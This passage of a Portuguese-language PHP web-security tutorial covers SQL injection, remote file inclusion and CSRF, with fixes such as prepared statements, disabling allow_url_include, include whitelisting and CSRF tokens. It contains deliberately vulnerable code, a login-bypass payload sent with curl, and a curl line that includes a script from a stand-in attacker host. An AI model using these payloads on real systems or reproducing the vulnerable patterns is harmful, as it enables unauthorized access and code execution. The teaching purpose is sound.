    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mysql_num_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$result&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Vai para a página logada&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Login com sucesso&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Usuário e senha inválidos&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Vai para a página de login&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levando em consideração que temos um usuário com nome &lt;code&gt;teste&lt;/code&gt; e senha
&lt;code&gt;teste&lt;/code&gt;, se executarmos a instrução abaixo, será exibida uma mensagem
de &lt;em&gt;login&lt;/em&gt; inválido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl --data &lt;span class="s2"&gt;&amp;quot;usuario=foo&amp;amp;senha=bar&amp;quot;&lt;/span&gt; http://localhost/sql-injection.php

Usuário e senha inválidos
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Evidente! Este usuário não existe no banco de dados. Mas, podemos
imaginar que a aplicação não possua proteção contra injeções &lt;em&gt;SQL&lt;/em&gt;,
então podemos fazer com que a consulta retorne positivo, e que nosso
acesso seja garantido mesmo não possuindo um usuário no banco de dados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl --data &lt;span class="s2"&gt;&amp;quot;usuario=foo&amp;amp;senha=bar&amp;#39; OR &amp;#39;1&amp;#39; = &amp;#39;1&amp;quot;&lt;/span&gt; http://localhost/sql-injection.php

Login com sucesso
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A nossa &lt;em&gt;query&lt;/em&gt;, por não fazermos um tratamento nos campos do
formulário, foi composta pelo valor &lt;code&gt;bar’ OR '1’ = ’1&lt;/code&gt;, o que resultou
no seguinte &lt;em&gt;SQL&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;usuario&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;usuario&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;foo&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;senha&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bar&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Existem algumas soluções para este problema, como o uso de
&lt;code&gt;addslashes&lt;/code&gt; no &lt;em&gt;PHP&lt;/em&gt;, mas os que fazem mais sentido para mim são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;O uso da função &lt;code&gt;mysql_real_escape_string&lt;/code&gt; para formatar dados
  antes de construir a &lt;em&gt;query&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;O uso da classe &lt;code&gt;mysqli&lt;/code&gt; para consultas a bancos de dados &lt;em&gt;MySQL&lt;/em&gt;,
  ao invés do uso das funções &lt;em&gt;mysql&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A primeira é a mais prática de aplicarmos. No código anterior, bastaria
formatar os valores na hora que são resgatados do &lt;em&gt;array&lt;/em&gt; &lt;code&gt;$_POST&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;$usuario    = mysql_real_escape_string($_POST[&amp;#39;usuario&amp;#39;]);&lt;/span&gt;
&lt;span class="x"&gt;$senha      = mysql_real_escape_string($_POST[&amp;#39;senha&amp;#39;]);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o &lt;strong&gt;mysqli&lt;/strong&gt;, precisamos fazer algumas alterações no código, como
demonstrado abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="c1"&gt;# sql-injection.php (com mysqli)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;senha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$usuario&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="nv"&gt;$senha&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;senha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="c1"&gt;// Abre conexão com o banco de dados&lt;/span&gt;
    &lt;span class="nv"&gt;$mysqli&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;mysqli&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;exemplos_blog&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$mysqli&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;prepare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT 1 FROM usuario WHERE usuario = ? &amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AND senha = ?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;bind_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$usuario&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$senha&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;store_result&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nv"&gt;$num_rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;num_rows&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="nv"&gt;$query&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$num_rows&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Vai para a página logada&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Login com sucesso&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Usuário e senha inválidos&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Vai para a página de login&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas como o mundo não é feito só de &lt;em&gt;MySQL&lt;/em&gt;, se ocorrer de você utilizar
um outro banco de dados, eu recomendo o uso da biblioteca &lt;a href="http://php.net/pdo" title="Conheça a lib PDO do PHP"&gt;&lt;em&gt;PDO&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Como o &lt;a href="https://docs.djangoproject.com/en/1.4/topics/db/queries/" title="Making queries"&gt;&lt;em&gt;Django&lt;/em&gt; utiliza &lt;em&gt;ORM&lt;/em&gt;&lt;/a&gt;, e o &lt;a href="http://codeigniter.com/user_guide/database/active_record.html" title="Active Record Class"&gt;&lt;em&gt;Codeigniter&lt;/em&gt; tem a &lt;em&gt;Active
Record Class&lt;/em&gt;&lt;/a&gt;, nesses &lt;em&gt;frameworks&lt;/em&gt; essa validação é feita no momento
que interagimos com os seus &lt;em&gt;models&lt;/em&gt;. Mas é sempre bom ter cuidado!
Principalmente quando o &lt;em&gt;ORM&lt;/em&gt; não atende o nosso requisito, e temos que
partir para consultas &lt;em&gt;SQL&lt;/em&gt; puras.&lt;/p&gt;
&lt;h3&gt;Senhas criptografadas&lt;/h3&gt;
&lt;p&gt;Uma boa dica é, sempre que persistirmos um usuário em nossa base de
dados, armazenarmos a sua senha criptografada em um formato “sem volta”
(conhecido como &lt;em&gt;hash&lt;/em&gt;). Além de ser um princípio ético, que na minha
opinião todo o desenvolver de aplicações deveria ter, garantimos que
mesmo que a nossa aplicação seja invadida, as senhas dos usuários
estarão “seguras”.&lt;/p&gt;
&lt;p&gt;Embora o &lt;a href="http://pt.wikipedia.org/wiki/MD5" title="Conheça o algoritmo MD5"&gt;&lt;em&gt;MD5&lt;/em&gt;&lt;/a&gt; e o &lt;a href="http://pt.wikipedia.org/wiki/SHA1" title="Conheça o algoritmo SHA1"&gt;&lt;em&gt;SHA1&lt;/em&gt;&lt;/a&gt; sejam as escolhas mais populares, os
desenvolvedores do &lt;em&gt;Django&lt;/em&gt; &lt;a href="https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing" title="Leia a release note do Django 1.4"&gt;recomendam o uso de algoritmos mais sofisticados&lt;/a&gt;,
como o &lt;a href="http://en.wikipedia.org/wiki/PBKDF2" title="Conheça o algoritmo PBKDF2"&gt;&lt;em&gt;PBKDF2&lt;/em&gt;&lt;/a&gt;, por acreditarem que o poder
computacional atingiu um nível, que senhas &lt;em&gt;MD5&lt;/em&gt; e &lt;em&gt;SHA1&lt;/em&gt; podem com
considerável esforço ser quebradas.&lt;/p&gt;
&lt;h2&gt;PHP Injection (não confie no PHP)&lt;/h2&gt;
&lt;p&gt;Embora esta técnica possa acontecer em outras linguagens, o &lt;em&gt;PHP&lt;/em&gt; dá
muita margem para desenvolvedores menos experientes deixarem brechas
para uma vulnerabilidade conhecida como &lt;strong&gt;&lt;em&gt;PHP
Injection&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Com o site dividido em seções, é comum termos inclusões de arquivos
&lt;em&gt;PHP&lt;/em&gt; para compor uma página. Para economizar esforço e linhas de
código, deixamos as partes como menu e topo “estáticas”, e só alteramos
o conteúdo do bloco principal da página. Acontece que em alguns casos, o
desenvolvedor espera que um determinado arquivo seja importado de acordo
com a &lt;em&gt;URL&lt;/em&gt; que o internauta está visitando. Por exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="c1"&gt;# php-injection.php&lt;/span&gt;

&lt;span class="nv"&gt;$page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;page&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;topo.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;menu.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$page&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Logo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl http://localhost/php-injection.php?page&lt;span class="o"&gt;=&lt;/span&gt;novidades.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No caso acima, estamos incluindo o arquivo &lt;code&gt;novidades.php&lt;/code&gt; e
automaticamente exibindo o seu conteúdo. Podemos navegar por outras
áreas do &lt;em&gt;website&lt;/em&gt;, por exemplo, &lt;code&gt;page=contato.php&lt;/code&gt; ou
&lt;code&gt;page=institucional.php&lt;/code&gt;. Mas, e se informarmos
&lt;code&gt;page=php-injection.php&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Caímos num &lt;em&gt;looping&lt;/em&gt; infinito!&lt;/p&gt;
&lt;p&gt;E, infelizmente, esse é o menor dos nossos problemas. O &lt;em&gt;PHP&lt;/em&gt;, quando
configurado com a opção &lt;code&gt;allow_url_include&lt;/code&gt; como &lt;code&gt;TRUE&lt;/code&gt;, é capaz
de importar arquivos de outros &lt;em&gt;hosts&lt;/em&gt;. Logo, o atacante pode ter um
&lt;em&gt;script&lt;/em&gt; malicioso hospedado em seu servidor, e passar o caminho dele
para a aplicação acima. A aplicação incluirá e interpretará o &lt;em&gt;PHP&lt;/em&gt; que
estiver neste &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl http://localhost/php-injection.php?page&lt;span class="o"&gt;=&lt;/span&gt;http://sitedoatacante.com.br/meu-script-malicioso.php.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Temos código &lt;em&gt;PHP&lt;/em&gt; de outra pessoa executando em nosso servidor.&lt;/p&gt;
&lt;p&gt;Para resolver este problema, configure a opção &lt;code&gt;allow_url_include&lt;/code&gt;
em seu &lt;code&gt;php.ini&lt;/code&gt; como &lt;code&gt;FALSE&lt;/code&gt;. Outro passo importante é, sempre que
for importar algum arquivo que dependa de informações vindas do usuário,
verifique o conteúdo desta informação. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;switch($page) {&lt;/span&gt;
&lt;span class="x"&gt;    case &amp;#39;novidades&amp;#39;:&lt;/span&gt;
&lt;span class="x"&gt;        include(&amp;#39;novidades.php&amp;#39;);&lt;/span&gt;
&lt;span class="x"&gt;        break;&lt;/span&gt;
&lt;span class="x"&gt;    case &amp;#39;contato&amp;#39;:&lt;/span&gt;
&lt;span class="x"&gt;        include(&amp;#39;contato.php&amp;#39;);&lt;/span&gt;
&lt;span class="x"&gt;        break;&lt;/span&gt;
&lt;span class="x"&gt;    case &amp;#39;institucional&amp;#39;:&lt;/span&gt;
&lt;span class="x"&gt;        include(&amp;#39;institucional.php&amp;#39;);&lt;/span&gt;
&lt;span class="x"&gt;        break;&lt;/span&gt;
&lt;span class="x"&gt;    default:&lt;/span&gt;
&lt;span class="x"&gt;        include(&amp;#39;404.php&amp;#39;);&lt;/span&gt;
&lt;span class="x"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este ataque não é tão incomum quanto deveria. Fique atento.&lt;/p&gt;
&lt;h2&gt;CSRF – Cross-site request forgery (não confie na requisição)&lt;/h2&gt;
&lt;p&gt;O &lt;strong&gt;&lt;em&gt;Cross-site request forgery&lt;/em&gt;&lt;/strong&gt; ou &lt;strong&gt;falsificação de solicitação
entre sites&lt;/strong&gt;, é uma forma de ataque que mescla a &lt;a href="http://pt.wikipedia.org/wiki/Engenharia_social_(seguran%C3%A7a_da_informa%C3%A7%C3%A3o)" title="Leia mais sobre Engenharia Social no Wikipedia"&gt;Engenharia Social&lt;/a&gt;
com vulnerabilidades das aplicações &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O ataque pode ser feito da seguinte forma:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Você recebe um &lt;em&gt;e-mail&lt;/em&gt; com uma &lt;em&gt;URL&lt;/em&gt; oculta (geralmente algum
  &lt;em&gt;e-mail&lt;/em&gt; do tipo “Veja as minhas fotos” (: )&lt;/li&gt;
&lt;li&gt;Esta &lt;em&gt;URL&lt;/em&gt; executa alguma ação em uma aplicação que você esteja
  autenticado no momento (por exemplo, o &lt;em&gt;Facebook&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Esta ação pode, tanto dar poderes de acesso ao atacante, quanto
  alterar ou remover os seus dados permanentemente&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note que o primeiro item pode ser substituído por algum &lt;strong&gt;conteúdo
&lt;em&gt;link&lt;/em&gt; injetado via &lt;em&gt;XSS&lt;/em&gt;&lt;/strong&gt; em algum fórum ou área de comentários de um
&lt;em&gt;blog&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Embora o exemplo acima não represente tanta ameaça, existem vários tipos
de aplicações que este tipo de técnica pode afetar. O exemplo do banco,
encontrado no &lt;em&gt;site&lt;/em&gt; &lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" title="Leia mais sobre CSRF"&gt;&lt;em&gt;The Open Web Application Security Project&lt;/em&gt;&lt;/a&gt;, é
um excelente exempo de ataque &lt;em&gt;CSRF&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para prevenir este tipo de problema, podemos fazer um controle através
de &lt;a href="https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html" title="Entendendo o Cookies e Sessões"&gt;sessões&lt;/a&gt; e transmitir um &lt;em&gt;token&lt;/em&gt; que identifique que a requisição
foi de fato feita pelo usuário. &lt;em&gt;Kinn Coelho Julião&lt;/em&gt; escreveu &lt;a href="http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/" title="Protegendo seus sistemas contra ataques CSRF"&gt;um &lt;em&gt;post&lt;/em&gt; interessante para o &lt;em&gt;PHP-SP&lt;/em&gt;&lt;/a&gt;,
demonstrando como prevenir ataques &lt;em&gt;CSRF&lt;/em&gt; através de &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De fato, tanto o &lt;em&gt;Django&lt;/em&gt; quanto o &lt;em&gt;Codeigniter&lt;/em&gt; utilizam essa tática
para prevenir ataques &lt;em&gt;CSRF&lt;/em&gt;. No &lt;em&gt;Django&lt;/em&gt;, com o &lt;em&gt;middleware&lt;/em&gt;
&lt;code&gt;django.middleware.csrf.CsrfViewMiddleware&lt;/code&gt;, basta adicionar a chamada
da &lt;em&gt;templatetag&lt;/em&gt; ao formulário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    {% csrf_token %}
    ...
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A &lt;em&gt;templatetag&lt;/em&gt; acima criará um campo oculto no formulário chamado
&lt;code&gt;csrfmiddlewaretoken&lt;/code&gt;. Quando um &lt;em&gt;POST&lt;/em&gt; for realizado para a &lt;em&gt;view&lt;/em&gt; em
questão, caso o conteúdo de &lt;code&gt;csrfmiddlewaretoken&lt;/code&gt; vindo do formulário
não “bata” com o conteúdo armazenado em sessão, o &lt;em&gt;Django&lt;/em&gt; entende que
aquela requisição não foi feita de maneira “natural” (ou seja, acessando
o formulário e submetendo-o). Logo, fica subentendido que aquela
requisição veio de outra origem, e o &lt;em&gt;framework&lt;/em&gt; não executa as
instruções da &lt;em&gt;view&lt;/em&gt; (retornando um código 403).&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Codeigniter&lt;/em&gt;, com a opção &lt;code&gt;$config['csrf_protection’]&lt;/code&gt; como
&lt;code&gt;TRUE&lt;/code&gt; no arquivo &lt;code&gt;application/config/config.php&lt;/code&gt;, o &lt;em&gt;framework&lt;/em&gt;
adicionará automaticamente o campo de proteção &lt;em&gt;CSRF&lt;/em&gt; na abertura do
formulário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nx"&gt;form_open&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Ficou um &lt;em&gt;post&lt;/em&gt; grande, mas acredito que consegui cobrir os problemas de
segurança mais conhecidos em aplicações &lt;em&gt;Web&lt;/em&gt;. Como é possível notar,
são vulnerabilidades que são facilmente contornáveis, mas que podem
trazer sérios problemas para você e seus usuários caso a sua aplicação
não esteja segura o bastante.&lt;/p&gt;
&lt;p&gt;Reforço: Se você tiver a oportunidade de utilizar um &lt;em&gt;framework&lt;/em&gt;,
utilize! Eles possuem soluções prontas e bem testadas para prevenir os
problemas citados acima, e outros tantos que surgem a cada dia na
&lt;em&gt;internet&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/" title="As diferentes formas de validarmos um valor inteiro em PHP"&gt;&lt;em&gt;Caugh in a Web: Validating an integer in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://codeigniter.com/user_guide/database/active_record.html" title="Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"&gt;&lt;em&gt;Codeigniter User Guide: Active Record Class&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://codeigniter.com/user_guide/general/security.html" title="Veja as dicas de segurança dadas pelo time do Codeigniter"&gt;&lt;em&gt;Codeigniter User Guide: Security&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.4/topics/db/queries/" title="Saiba como construir modelos e como consultá-los através do ORM do Django"&gt;&lt;em&gt;Django Documentation: Making queries&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/topics/security/" title="Veja dicas preciosas de segurança utilizando o Django"&gt;&lt;em&gt;Django Documentation: Security in Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/" title="Entenda como funciona um ataque via PHP Injection"&gt;Invasão.com.br: &lt;em&gt;PHP Injection&lt;/em&gt; – O fim das dúvidas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.php.net/manual/pt_BR/book.mysqli.php" title="Conheça a mysqli direto da documentação do PHP"&gt;&lt;em&gt;PHP Documentation: MySQL Melhorada&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://php.net/pdo" title="Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"&gt;&lt;em&gt;PHP Documentation: PDO – PHP Data Objects&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/" title="Aprenda como utilizar tolkens para prevenir ataques CSRF"&gt;&lt;em&gt;PHP SP&lt;/em&gt;: Protegendo o seu sistema contra ataques &lt;em&gt;CSRF&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sitepoint.com/php-security-blunders/" title="Excelentes dicas de segurança para quem programa em PHP"&gt;&lt;em&gt;Site Point: Top 7 PHP Security Blunders Article&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php" title="Excelente thread no Stack Overflow, sobre SQL injection"&gt;&lt;em&gt;Stack Overflow: Best way to stop SQL injection in PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" title="Um bom artigo sobre o conceito do CSRF"&gt;&lt;em&gt;The Open Web Application Security Project: Cross-Site Request Forgery&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
